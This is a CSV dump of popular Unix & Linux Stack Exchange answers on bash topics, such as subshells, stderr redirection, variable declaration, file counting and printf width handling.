Title,Id,Tags,Score,Body
"Making zsh default shell without root access","136423","<bash><zsh><login><profile>","61","<p>Create <code>.bash_profile</code> in your home directory and add these lines:</p>

<pre><code>export SHELL=/bin/zsh
exec /bin/zsh -l
</code></pre>

<p>Update: <code>.profile</code> may work as a general solution when default shell is not bash. I'm not sure if <code>.profile</code> may be called by Zsh as well that it could go redundant but we can do it safely with a simple check:</p>

<pre><code>export SHELL=/bin/zsh
[ -z ""$ZSH_VERSION"" ] &amp;&amp; exec /bin/zsh -l
</code></pre>

<p>We can also use <code>which</code> to get the dynamic path of <code>zsh</code> which relies on the value of <code>$PATH</code>:</p>

<pre><code>export SHELL=`which zsh`
[ -z ""$ZSH_VERSION"" ] &amp;&amp; exec ""$SHELL"" -l
</code></pre>
"
"How to print only defined variables (shell and/or environment variables) in bash","3510","<bash><environment-variables>","61","<p>""Are there other commands which prints only the shell variables, without the functions?""</p>

<p>In man bash, in section SHELL BUILTIN COMMANDS (in the set section) it says:
""In posix mode,  only  shell variables  are listed.""</p>

<pre><code>(set -o posix; set)
</code></pre>

<p>note: <code>()</code> syntax spawns a subshell, if you don't like forking just use the more verbose version</p>

<pre><code>set -o posix; set; set +o posix
</code></pre>
"
"Refresh aliases and functions after defining new aliases and functions?","22919","<bash><terminal><alias><bashrc><function>","61","<p>Sourcing the changed file will provide access to the newly written alias or function in the current terminal, for example:</p>

<pre><code>source ~/.bashrc</code></pre>

<p>An alternative syntax:</p>

<pre><code>. ~/.bashrc
</code></pre>

<p>Note that if you have many instances of bash running in your terminal (you mentionned multiple tabs), you will have to run this in every instance.</p>
"
"Why does bash think: 016 + 1 = 15?","178162","<bash>","61","<p>The misunderstanding is that the numbers don't mean what you expect.</p>

<p>A leading zero denotes a number with base 8. I.e. <code>016</code> is the same as <code>8#16</code>. If you want to keep the leading zero then you need <code>10#016</code>.</p>

<pre><code>&gt; num=016
&gt; echo $((num))
14
&gt; echo $((10#$num))
16
</code></pre>
"
"How to echo a bang!","3051","<command-line><bash><echo>","61","<p>Try using single quotes.</p>

<pre><code>echo -e '#!/bin/bash \n /usr/bin/command args'  &gt; .scripts/command

echo '#!'

echo '#!/bin/bash'
</code></pre>

<p>The problem is occurring because bash is searching its history for !/bin/bash. Using single quotes escapes this behaviour.</p>
"
"Bash: run command2 if command1 fails","15415","<bash><shell-script><exit-status>","61","<p>These should do what you need:</p>

<pre><code>cmd1 &amp;&amp; cmd2 &amp;&amp; echo success || echo epic fail
</code></pre>

<p>or</p>

<pre><code>if cmd1 &amp;&amp; cmd2; then
    echo success
else
    echo epic fail
fi
</code></pre>
"
"How to create custom commands in Unix/Linux?","84686","<linux><bash><shell><command>","61","<p>Create a bash script in your /usr/bin folder, it should look something like this</p>

<pre><code>#!/bin/bash
Whatever combination of commands you want to run when you type this thing.
</code></pre>

<p>Its really that easy.</p>

<p>Just name the bash script what you want to type in to the terminal, and make it excecutable: <code>chmod +x filename</code> and you're good to go!</p>
"
"Terminating an infinite loop","42287","<bash><signals>","61","<p>Check the exit status of the command.  If the command was terminated by a signal the exit code will be 128 + the signal number.  From the <a href=""http://www.gnu.org/software/bash/manual/bashref.html#Exit-Status"">GNU online documentation for bash</a>:</p>

<blockquote>
  <p>For the shell’s purposes, a command which exits with a zero exit status has succeeded. A non-zero exit status indicates failure. This seemingly counter-intuitive scheme is used so there is one well-defined way to indicate success and a variety of ways to indicate various failure modes. When a command terminates on a fatal signal whose number is N, Bash uses the value 128+N as the exit status.</p>
</blockquote>

<p><a href=""http://pubs.opengroup.org/onlinepubs/9699919799/utilities/V3_chap02.html#tag_18_08_02"">POSIX also specifies</a> that the value of a command that terminated by a signal is greater than 128, but does not seem to specify its exact value like GNU does:</p>

<blockquote>
  <p>The exit status of a command that terminated because it received a signal shall be reported as greater than 128.</p>
</blockquote>

<p>For example if you interrupt a command with control-C the exit code will be 130, because SIGINT is signal 2 on Unix systems.  So:</p>

<pre><code>while [ 1 ]; do COMMAND; test $? -gt 128 &amp;&amp; break; done
</code></pre>
"
"cd by just typing the directory's name?","37181","<bash><shell><command-line><directory><cd-command>","60","<ul>
<li>Bash:  <code>shopt -s autocd</code></li>
<li>Zsh: <code>setopt autocd</code></li>
<li>tcsh: <code>set implicitcd</code></li>
</ul>

<p>Also, 'autojump' is a useful tool.  Once installed it remembers directories so that you can type j abc and if you've visited abc before, say x/d/f/g/t/abc then it will cd to there!<br>
<a href=""https://github.com/joelthelion/autojump"">https://github.com/joelthelion/autojump</a></p>
"
"suppress stderr messages in a bash script","184804","<bash><shell-script><stderr>","60","<p>You're right; pkill isn't generating the message, bash is. 
You suggest that</p>

<pre class=""lang-none prettyprint-override""><code>$ ./test1.sh 2&gt; /dev/null
</code></pre>

<p>is a possible solution. 
As UVV points out, the equivalent action from within the script is</p>

<pre class=""lang-none prettyprint-override""><code>exec 2&gt; /dev/null
</code></pre>

<p>This redirects the stderr for the script to <code>/dev/null</code>
from this statement until it is changed back. 
Clumsy ways of changing it back include</p>

<pre class=""lang-none prettyprint-override""><code>exec 2&gt; /dev/tty
</code></pre>

<p>which redirects stderr to the terminal. 
This is probably (but not necessarily) where it was originally.</p>

<p>Or</p>

<pre class=""lang-none prettyprint-override""><code>exec 2&gt;&amp;1
</code></pre>

<p>which sets stderr to be the same as stdout, and is likely to be wrong.</p>

<p>A more reliable way is</p>

<pre>exec 3>&2
exec 2> /dev/null
<i>(do stuff where you don't want to see the stderr.)</i>
exec 2>&3</pre>

<p>which saves the original stderr in file descriptor 3, and later restores it.</p>

<p>Other ways to suppress just the announcement of the process death include</p>

<pre class=""lang-none prettyprint-override""><code>(sleep 10 &amp; pkill sleep) 2&gt; /dev/null
</code></pre>

<p>and</p>

<pre class=""lang-none prettyprint-override""><code>{ sleep 10 &amp; pkill sleep;} 2&gt; /dev/null
</code></pre>

<p>which change the stderr for only the grouped commands.</p>
"
"Why is bash not storing commands that start with spaces?","115917","<bash><command-history><whitespace>","60","<pre><code>echo $HISTCONTROL
ignoreboth
</code></pre>
<p>man bash:</p>
<blockquote>
<p>HISTCONTROL</p>
<p>A  colon-separated  list  of values controlling how commands are saved on the history list.  If the list of values includes <code>ignorespace</code>, lines which begin with a space character are not saved in the history list. A value of <code>ignoredups</code> causes lines matching the previous history entry to not be saved. A value of <code>ignoreboth</code> is shorthand for <code>ignorespace</code> and <code>ignoredups</code>.</p>
</blockquote>
"
"Is there any way to enable Ctrl+L to clear screen when 'set -o vi' is set?","104094","<bash><readline><vi-mode>","60","<p><kbd>Ctrl</kbd>+<kbd>L</kbd> is also bound in <code>vi</code> command mode but not in insert mode. There's no default binding for <code>clear-screen</code> in insert mode. Readline bindings should be specified in <code>~/.inputrc</code>, like so:</p>
<pre class=""lang-bsh prettyprint-override""><code>set editing-mode vi
$if mode=vi

set keymap vi-command
# these are for vi-command mode
Control-l: clear-screen

set keymap vi-insert
# these are for vi-insert mode
Control-l: clear-screen 
$endif
</code></pre>
<p>This will bind <kbd>Ctrl</kbd>+<kbd>L</kbd> to clear the screen in both normal and insert mode. Naturally, if you prefer to only use it in one mode, just remove the relevant option.</p>
<p>If you prefer to set this just for <code>bash</code> use the following equivalents in <code>~/.bashrc</code>:</p>
<pre class=""lang-bsh prettyprint-override""><code>set -o vi
bind -m vi-command 'Control-l: clear-screen'
bind -m vi-insert 'Control-l: clear-screen'
</code></pre>
<p>There is an <a href=""https://web.archive.org/web/20150403162757/http://linux.about.com/library/cmd/blcmdl3_readline.htm"" rel=""noreferrer"">extensive list of readline commands</a> that you can use to customize your bash shell with.</p>
"
"How does `yes` write to file so quickly?","257297","<bash><coreutils><write><yes>","60","<h3>nutshell:</h3>

<p><code>yes</code> exhibits similar behavior to most other standard utilities which typically <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap03.html#tag_03_443"" rel=""noreferrer"">write</a> to a <a href=""https://www.le.ac.uk/users/rjm1/cotter/page_74.htm"" rel=""noreferrer"">FILE STREAM</a> with output buffered by the libC via <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/stdio.h.html"" rel=""noreferrer"">stdio</a>. These only do the syscall <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/write.html"" rel=""noreferrer""><code>write()</code></a> every some 4kb <em>(16kb or 64kb)</em> or whatever the output block <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/setbuf.html"" rel=""noreferrer"">BUFSIZ</a> is . <code>echo</code> is a <code>write()</code> per <em><code>GNU</code></em>. That's a <em>lot</em> of <a href=""https://stackoverflow.com/q/1860253/2955202"">mode-switching</a> <em>(which is not, apparently, as costly as a <a href=""https://en.wikipedia.org/wiki/Context_switch#User_and_kernel_mode_switching"" rel=""noreferrer"">context-switch</a>)</em>.</p>

<p>And that's not at all to mention that, besides its initial optimization loop, <code>yes</code> is a very simple, tiny, compiled C loop and your shell loop is in no way comparable to a compiler optimized program.</p>

<hr>

<h3>but i was wrong:</h3>

<p>When I said before that <code>yes</code> used stdio, I only assumed it did because it behaves a lot like those that do. This was not correct - it only emulates their behavior in this way. What it actually does is very like an analog to the thing I did below with the shell: it first loops to conflate its arguments <em>(or <code>y</code> if none)</em> until they might grow no more without exceeding <code>BUFSIZ</code>.</p>

<p>A comment from the <a href=""http://code.metager.de/source/xref/gnu/coreutils/src/yes.c"" rel=""noreferrer"">source</a> immediately preceding the relevant <code>for</code> loop states:</p>



<pre><code>/* Buffer data locally once, rather than having the
large overhead of stdio buffering each item.  */
</code></pre>

<p><code>yes</code> does its does its own <code>write()</code>s thereafter.</p>

<hr>

<h3>digression:</h3>

<p><em>(As originally included in the question and retained for context to a possibly informative explanation already written here)</em>:</p>

<blockquote>
  <p>I've tried <code>timeout 1 $(while true; do echo ""GNU""&gt;&gt;file2; done;)</code> but unable to stop loop.</p>
</blockquote>

<p>The <code>timeout</code> problem you have with the command substitution - I think I get it now, and can explain why it doesn't stop. <code>timeout</code> doesn't start because its command-line is never run. Your shell forks a child shell, opens a pipe on its stdout, and reads it. It will stop reading when the child quits, and then it will interpret all the child wrote for <code>$IFS</code> mangling and glob expansions, and with the results it will replace everything from <code>$(</code> to the matching <code>)</code>.</p>

<p>But if the child is an endless loop that never writes to the pipe, then the child never stops looping, and <code>timeout</code>'s command-line is never completed before <em>(as I guess)</em> you do <code>CTRL-C</code> and kill the child loop. So <code>timeout</code> can  <em>never</em> kill the loop which needs to complete before it can start.   </p>

<hr>

<h3>other <code>timeout</code>s:</h3>

<p>...simply aren't as relevant to your performance issues as the amount of time your shell program must spend switching between user- and kernel-mode to handle output. <code>timeout</code>, though, is not as flexible as a shell might be for this purpose: where shells excel is in their ability to mangle arguments and manage other processes.</p>

<p>As is noted elsewhere, simply moving your <em><code>[fd-num] &gt;&gt; named_file</code></em> redirection to the loop's output target rather than only directing output there for the command looped over can substantially improve performance because that way at least the <a href=""http://pubs.opengroup.org/onlinepubs/9699919799/functions/open.html"" rel=""noreferrer""><code>open()</code></a> syscall need only be done the once. This also is done below with the <code>|</code> pipe targeted as output for the inner loops.</p>

<hr>

<h3>direct comparison:</h3>

<p>You might do like:</p>

<pre class=""lang-sh prettyprint-override""><code>for cmd in  exec\ yes 'while echo y; do :; done'
do      set +m
        sh  -c '{ sleep 1; kill ""$$""; }&amp;'""$cmd"" | wc -l
        set -m
done
</code></pre>

<hr>

<pre><code>256659456
505401
</code></pre>

<p>Which is <em>kind</em> of like the command sub relationship described before, but there's no pipe and the child is backgrounded until it kills the parent. In the <code>yes</code> case the parent has actually been replaced since the child was spawned, but the shell calls <code>yes</code> by overlaying its own process with the new one and so the PID remains the same and its zombie child still knows who to kill after all.</p>

<hr>

<h3>bigger buffer:</h3>

<p>Now lets see about increasing the shell's <code>write()</code> buffer.</p>

<pre class=""lang-sh prettyprint-override""><code>IFS=""
"";    set y """"              ### sets up the macro expansion       
until [ ""${512+1}"" ]        ### gather at least 512 args
do    set ""$@$@"";done       ### exponentially expands ""$@""
printf %s ""$*""| wc -c       ### 1 write of 512 concatenated ""y\n""'s  
</code></pre>

<hr>

<pre><code>1024
</code></pre>

<p>I chose that number because output strings any longer than 1kb were getting split out into separate <code>write()</code>'s for me. And so here's the loop again:</p>

<pre class=""lang-sh prettyprint-override""><code>for cmd in 'exec  yes' \
           'until [ ""${512+:}"" ]; do set ""$@$@""; done
            while printf %s ""$*""; do :; done'
do      set +m
        sh  -c $'IFS=""\n""; { sleep 1; kill ""$$""; }&amp;'""$cmd"" shyes y """"| wc -l
        set -m
done
</code></pre>

<hr>

<pre><code>268627968
15850496
</code></pre>

<p>That's 300 times the amount of data written by the shell in the same amount of time for this test than the last. Not too shabby. But it's not <code>yes</code>.</p>

<hr>

<h3>related:</h3>

<p>As requested, there is a more thorough description than the mere code comments on what is done here at <a href=""https://unix.stackexchange.com/a/250626/52934"">this link</a>.</p>
"
"Is $() a subshell?","442692","<bash><subshell><syntax>","60","<p><code>$(…)</code> is a subshell by definition: it's a copy of the shell runtime state¹, and changes to the state made in the subshell have no impact on the parent. A subshell is typically implemented by <a href=""http://en.wikipedia.org/wiki/Fork_(system_call)"" rel=""noreferrer"">forking</a> a new process (but some shells may optimize this in some cases).</p>

<p>It isn't a subshell that you can retrieve variable values from. If changes to variables had an impact on the parent, it wouldn't be a subshell. It's a subshell whose <em>output</em> the parent can retrieve. The subshell created by <code>$(…)</code> has its standard output set to a pipe, and the parent reads from that pipe and collects the output.</p>

<p>There are several other constructs that create a subshell. I think this is the full list for bash:</p>

<ul>
<li>Subshell for <a href=""https://www.gnu.org/software/bash/manual/html_node/Command-Grouping.html#Command-Grouping"" rel=""noreferrer"">grouping</a>: <code>( … )</code> does nothing but create a subshell and wait for it to terminate). Contrast with <code>{ … }</code> which groups commands purely for syntactic purposes and does not create a subshell.</li>
<li><a href=""https://www.gnu.org/software/bash/manual/html_node/Lists.html"" rel=""noreferrer"">Background</a>: <code>… &amp;</code> creates a subshell and does not wait for it to terminate.</li>
<li><a href=""https://www.gnu.org/software/bash/manual/html_node/Pipelines.html#Pipelines"" rel=""noreferrer"">Pipeline</a>: <code>… | …</code> creates two subshells, one for the left-hand side and one for the right-hand side, and waits for both to terminate. The shell creates a pipe and connects the left-hand side's standard output to the write end of the pipe and the right-hand side's standard input to the read end. In some shells (ksh88, ksh93, zsh, bash with the <a href=""https://www.gnu.org/software/bash/manual/html_node/The-Shopt-Builtin.html#index-shopt"" rel=""noreferrer""><code>lastpipe</code> option</a> set and effective), the right-hand side runs in the original shell, so the pipeline construct only creates one subshell.</li>
<li><a href=""https://www.gnu.org/software/bash/manual/html_node/Command-Substitution.html#Command-Substitution"" rel=""noreferrer"">Command substitution</a>: <code>$(…)</code> (also spelled <code>`…`</code>) creates a subshell with its standard output set to a pipe, collects the output in the parent and expands to that output, minus its trailing newlines. (And the output may be further subject to splitting and globbing, but that's another story.)</li>
<li><a href=""https://www.gnu.org/software/bash/manual/html_node/Process-Substitution.html#Process-Substitution"" rel=""noreferrer"">Process substitution</a>: <code>&lt;(…)</code> creates a subshell with its standard output set to a pipe and expands to the name of the pipe. The parent (or some other process) may open the pipe to communicate with the subshell. <code>&gt;(…)</code> does the same but with the pipe on standard input.</li>
<li><a href=""https://www.gnu.org/software/bash/manual/html_node/Coprocesses.html#Coprocesses"" rel=""noreferrer"">Coprocess</a>: <code>coproc …</code> creates a subshell and does not wait for it to terminate. The subshell's standard input and output are each set to a pipe with the parent being connected to the other end of each pipe.</li>
</ul>

<p>¹ <sub> <a href=""https://unix.stackexchange.com/questions/261638/is-a-sub-shell-the-same-thing-as-a-child-shell"">As opposed to running a separate shell</a>. </sub>  </p>
"
"In bash scripting, what's the different between declare and a normal variable?","254367","<bash><shell-script><variable>","60","<p>From <code>help -m declare</code>:</p>

<blockquote>
  <p><strong>NAME</strong><ul>
          <code>declare</code> - Set variable values and attributes.</ul></p>
  
  <p><strong>SYNOPSIS</strong><ul>
          <strong><code>declare</code></strong> [<strong><code>-aAfFgilnrtux</code></strong>] [<strong><code>-p</code></strong>] [<em><code>name</code></em>[<code>=<i>value</i></code>] ...]</ul></p>
  
  <p><strong>DESCRIPTION</strong><ul>
          Set variable values and attributes.</p>
  
  <p>Declare variables and give them attributes.  If no NAMEs are given,
          display the attributes and values of all variables.</p>
  
  <p>Options:<ul>
            <strong><code>-f</code></strong><ul>  restrict action or display to function names and definitions</ul>
            <strong><code>-F</code></strong><ul>  restrict display to function names only (plus line number and
              source file when debugging)</ul>
            <strong><code>-g</code></strong><ul>  create global variables when used in a shell function; otherwise
              ignored</ul>
            <strong><code>-p</code></strong><ul>  display the attributes and value of each NAME</ul></ul></p>
  
  <p>Options which set attributes:<ul>
            <strong><code>-a</code></strong><ul>  to make NAMEs indexed arrays (if supported)</ul>
            <strong><code>-A</code></strong><ul>  to make NAMEs associative arrays (if supported)</ul>
            <strong><code>-i</code></strong><ul>  to make NAMEs have the ‘integer’ attribute</ul>
            <strong><code>-l</code></strong><ul>  to convert NAMEs to lower case on assignment</ul>
            <strong><code>-n</code></strong><ul>  make NAME a reference to the variable named by its value</ul>
            <strong><code>-r</code></strong><ul>  to make NAMEs readonly</ul>
            <strong><code>-t</code></strong><ul>  to make NAMEs have the ‘trace’ attribute</ul>
            <strong><code>-u</code></strong><ul>  to convert NAMEs to upper case on assignment</ul>
            <strong><code>-x</code></strong><ul>  to make NAMEs export</ul></ul></p>
  
  <p>Using ‘<strong><code>+</code></strong>’ instead of ‘<strong><code>-</code></strong>’ turns off the given attribute.</p>
  
  <p>Variables with the integer attribute have arithmetic evaluation (see
          the <code>let</code> command) performed when the variable is assigned a value.</p>
  
  <p>When used in a function, <code>declare</code> makes NAMEs local, as with the <code>local</code>
          command.  The ‘<strong><code>-g</code></strong>’ option suppresses this behavior.</p>
  
  <p>Exit Status:<br>
          Returns success unless an invalid option is supplied or a variable
          assignment error occurs.</ul></p>
  
  <p><strong>SEE ALSO</strong><ul>
          bash(1)</ul></p>
  
  <p><strong>IMPLEMENTATION</strong><ul>
          GNU bash, version 4.3.11(1)-release (i686-pc-linux-gnu)<br>
          Copyright (C) 2013 Free Software Foundation, Inc.<br>
          License GPLv3+: GNU GPL version 3 or later &lt;http&colon;//gnu.org/licenses/gpl.html&gt;</ul></p>
</blockquote>

<hr>

<p>So, <code>declare</code> is used for setting variable values <strong>and attributes</strong>.</p>

<p>Let me show the use of two attributes with a very simple example:</p>

<pre><code>$ # First Example:
$ declare -r abc=ok
$ echo $abc
ok
$ abc=not-ok
bash: abc: readonly variable


$ # Second Example:
$ declare -i x=10
$ echo $x
10
$ x=ok
$ echo $x
0
$ x=15
$ echo $x
15
$ x=15+5
$ echo $x
20
</code></pre>

<p>From the above example, I think you should understand the usage of <strong><code>declare</code></strong> variable over normal variable! This type of <code>declare</code>ation is useful in functions, loops with scripting.</p>

<p>Also visit <a href=""http://www.tldp.org/LDP/abs/html/declareref.html"" rel=""noreferrer"">Typing variables: declare or typeset</a></p>
"
"With BASH after ""scrolling"" up to a previous command... how to then move on to the next in this history?","417052","<bash><command-history>","59","<p>Running the command with <kbd>Ctrl</kbd>+<kbd>o</kbd> instead of <kbd>Enter</kbd> will run a command from history and then queue up the next one instead of returning to the front of the bash history. </p>
"
"What's the most resource efficient way to count how many files are in a directory?","90106","<bash><shell><directory><ls>","59","<p>Short answer:</p>

<pre><code>\ls -afq | wc -l
</code></pre>

<p>(This includes <code>.</code> and <code>..</code>, so subtract 2.)</p>

<hr>

<p>When you list the files in a directory, three common things might happen:</p>

<ol>
<li>Enumerating the file names in the directory. This is inescapable: there is no way to count the files in a directory without enumerating them.</li>
<li>Sorting the file names. Shell wildcards and the <code>ls</code> command do that.</li>
<li>Calling <a href=""http://en.wikipedia.org/wiki/Stat_(system_call)"" rel=""noreferrer""><code>stat</code></a> to retrieve metadata about each directory entry, such as whether it is a directory.</li>
</ol>

<p>#3 is the most expensive by far, because it requires loading an inode for each file. In comparison all the file names needed for #1 are compactly stored in a few blocks. #2 wastes some CPU time but it is often not a deal breaker.</p>

<p>If there are no newlines in file names, a simple <code>ls -A | wc -l</code> tells you how many files there are in the directory. Beware that if you have an alias for <code>ls</code>, this may trigger a call to <code>stat</code> (e.g. <code>ls --color</code> or <code>ls -F</code> need to know the file type, which requires a call to <code>stat</code>), so from the command line, call <code>command ls -A | wc -l</code> or <code>\ls -A | wc -l</code> to avoid an alias.</p>

<p>If there are newlines in the file name, whether newlines are listed or not depends on the Unix variant. GNU coreutils and BusyBox default to displaying <code>?</code> for a newline, so they're safe.</p>

<p>Call <code>ls -f</code> to list the entries without sorting them (#2). This automatically turns on <code>-a</code> (at least on modern systems). The <code>-f</code> option is in POSIX but with optional status; most implementations support it, but not BusyBox. The option <code>-q</code> replaces non-printable characters including newlines by <code>?</code>; it's POSIX but isn't supported by BusyBox, so omit it if you need BusyBox support at the expense of overcounting files whose name contains a newline character.</p>

<p>If the directory has no subdirectories, then most versions of <code>find</code> will not call <code>stat</code> on its entries (leaf directory optimization: a directory that has a link count of 2 cannot have subdirectories, so <code>find</code> doesn't need to look up the metadata of the entries unless a condition such as <code>-type</code> requires it). So <code>find . | wc -l</code> is a portable, fast way to count files in a directory provided that the directory has no subdirectories and that no file name contains a newline.</p>

<p>If the directory has no subdirectories but file names may contain newlines, try one of these (the second one should be faster if it's supported, but may not be noticeably so).</p>

<pre><code>find -print0 | tr -dc \\0 | wc -c
find -printf a | wc -c
</code></pre>

<p>On the other hand, don't use <code>find</code> if the directory has subdirectories: even <code>find . -maxdepth 1</code> calls <code>stat</code> on every entry (at least with GNU find and BusyBox find). You avoid sorting (#2) but you pay the price of an inode lookup (#3) which kills performance.</p>

<p>In the shell without external tools, you can run count the files in the current directory with <code>set -- *; echo $#</code>. This misses dot files (files whose name begins with <code>.</code>) and reports 1 instead of 0 in an empty directory. This is the fastest way to count files in small directories because it doesn't require starting an external program, but (except in zsh) wastes time for larger directories due to the sorting step (#2).</p>

<ul>
<li><p>In bash, this is a reliable way to count the files in the current directory:</p>

<pre><code>shopt -s dotglob nullglob
a=(*)
echo ${#a[@]}
</code></pre></li>
<li><p>In ksh93, this is a reliable way to count the files in the current directory:</p>

<pre><code>FIGNORE='@(.|..)'
a=(~(N)*)
echo ${#a[@]}
</code></pre></li>
<li><p>In zsh, this is a reliable way to count the files in the current directory:</p>

<pre><code>a=(*(DNoN))
echo $#a
</code></pre>

<p>If you have the <code>mark_dirs</code> option set, make sure to turn it off: <code>a=(*(DNoN^M))</code>.</p></li>
<li><p>In any POSIX shell, this is a reliable way to count the files in the current directory:</p>

<pre><code>total=0
set -- *
if [ $# -ne 1 ] || [ -e ""$1"" ] || [ -L ""$1"" ]; then total=$((total+$#)); fi
set -- .[!.]*
if [ $# -ne 1 ] || [ -e ""$1"" ] || [ -L ""$1"" ]; then total=$((total+$#)); fi
set -- ..?*
if [ $# -ne 1 ] || [ -e ""$1"" ] || [ -L ""$1"" ]; then total=$((total+$#)); fi
echo ""$total""
</code></pre></li>
</ul>

<p>All of these methods sort the file names, except for the zsh one.</p>
"
"Why is printf ""shrinking"" umlaut?","350240","<bash><unicode><printf>","58","<p><a href=""http://pubs.opengroup.org/onlinepubs/9699919799/basedefs/V1_chap05.html#tag_05"" rel=""nofollow noreferrer"">POSIX <em>requires</em> <code>printf</code>'s <code>%-20s</code> to count those 20 in terms of <em>bytes</em></a> not <em>characters</em> even though that makes little sense as <code>printf</code> is to print <em>text</em>, formatted (see discussion <a href=""http://article.gmane.org/gmane.comp.standards.posix.austin.general/10048"" rel=""nofollow noreferrer"">at the Austin Group</a> (POSIX) and <a href=""https://lists.gnu.org/archive/html/bug-bash/2014-04/msg00017.html"" rel=""nofollow noreferrer""><code>bash</code></a> mailing lists).</p>
<p>The <code>printf</code> builtin of <code>bash</code> and most other POSIX shells honour that.</p>
<p><code>zsh</code> ignores that silly requirement (even in <code>sh</code> emulation) so <code>printf</code> works as you'd expect there. Same for the <code>printf</code> builtin of <code>fish</code> (not a POSIX-like shell).</p>
<p>The <code>ü</code> character (U+00FC), when encoded in UTF-8 is made of two bytes (0xc3 and 0xbc), which explains the discrepancy.</p>
<pre><code>$ printf %s 'Früchte und Gemüse' | wc -mcL
    18      20      18
</code></pre>
<p>That string is made of 18 characters, is 18 columns wide (<code>-L</code> being a GNU <code>wc</code> extension to report the display width of the widest line in the input) but is encoded on 20 bytes.</p>
<p>In <code>zsh</code> or <code>fish</code>, the text would be aligned correctly.</p>
<p>Now, there are also characters that have 0-width (like combining characters such as U+0308, the combining diaresis) or have double-width like in many Asiatic scripts (not to mention control characters like Tab) and even <code>zsh</code> wouldn't align those properly.</p>
<p>Example, in <code>zsh</code>:</p>
<pre><code>$ printf '%3s|\n' u ü $'u\u308' $'\u1100'
  u|
  ü|
 ü|
  ᄀ|
</code></pre>
<p>In <code>bash</code>:</p>
<pre><code>$ printf '%3s|\n' u ü $'u\u308' $'\u1100'
  u|
 ü|
ü|
ᄀ|
</code></pre>
<p><code>ksh93</code> has a <code>%Ls</code> format specification to count the width in terms of <em>display</em> width.</p>
<pre><code>$ printf '%3Ls|\n' u ü $'u\u308' $'\u1100'
  u|
  ü|
  ü|
 ᄀ|
</code></pre>
<p>That still <em>doesn't work</em> if the text contains control characters like TAB (how could it? <code>printf</code> would have to know how far apart the tab stops are in the output device and what position it starts printing at). It does work by accident with backspace characters (like in the <code>roff</code> output where <strong><code>X</code></strong> (bold <code>X</code>) is written as <code>X\bX</code>) though as <code>ksh93</code> considers all control characters as having a width of <code>-1</code>.</p>
<h2>Other options</h2>
<p>In <code>zsh</code>, you can use its padding parameter expansion flags (<code>l</code> for left-padding, <code>r</code> for right-padding), which when combined with the <code>m</code> flag considers the display width of characters (as opposed to the number of characters in the string):</p>
<pre><code>$ () { printf '%s|\n' &quot;${(ml[3])@}&quot;; } u ü $'u\u308' $'\u1100'
  u|
  ü|
  ü|
 ᄀ|
</code></pre>
<p>With <code>expand</code>:</p>
<pre><code>printf '%s\t|\n' u ü $'u\u308' $'\u1100' | expand -t3
</code></pre>
<p>That works with some <code>expand</code> implementations (not GNU's though).</p>
<p>On GNU systems, you could use GNU <code>awk</code> whose <code>printf</code> counts in chars (not bytes, not display-widths, so still not OK for the 0-width or 2-width characters, but OK for your sample):</p>
<pre><code>gawk 'BEGIN {for (i = 1; i &lt; ARGC; i++) printf &quot;%-3s|\n&quot;, ARGV[i]}
     ' u ü $'u\u308' $'\u1100'
</code></pre>
<p>If the output goes to a terminal, you can also use cursor positioning escape sequences. Like:</p>
<pre><code>forward21=$(tput cuf 21)
printf '%s\r%s%s\n' \
  &quot;Früchte und Gemüse&quot;    &quot;$forward21&quot; &quot;foo&quot; \
  &quot;Milchprodukte&quot;         &quot;$forward21&quot; &quot;bar&quot; \
  &quot;12345678901234567890&quot;  &quot;$forward21&quot; &quot;baz&quot;
</code></pre>
"
"What do the bash-builtins 'set' and 'export' do?","71144","<bash><shell>","58","<p><code>export</code> exports to children of the current process, by default they are not exported. For example:</p>

<pre><code>$ foo=bar
$ echo ""$foo""
bar
$ bash -c 'echo ""$foo""'

$ export foo
$ bash -c 'echo ""$foo""'
bar
</code></pre>

<p><code>set</code>, on the other hand, sets shell attributes, for example, the positional parameters.</p>

<pre><code>$ set foo=baz
$ echo ""$1""
foo=baz
</code></pre>

<p>Note that <code>baz</code> is not assigned to <code>foo</code>, it simply becomes a literal positional parameter. There are many other things <code>set</code> can do (mostly shell options), see <code>help set</code>.</p>

<p>As for printing, <code>export</code> called with no arguments prints all of the variables in the shell's environment. <code>set</code> also prints variables that are <em>not</em> exported. It can also export some other objects (although you should note that this is not portable), see <code>help export</code>.</p>
"
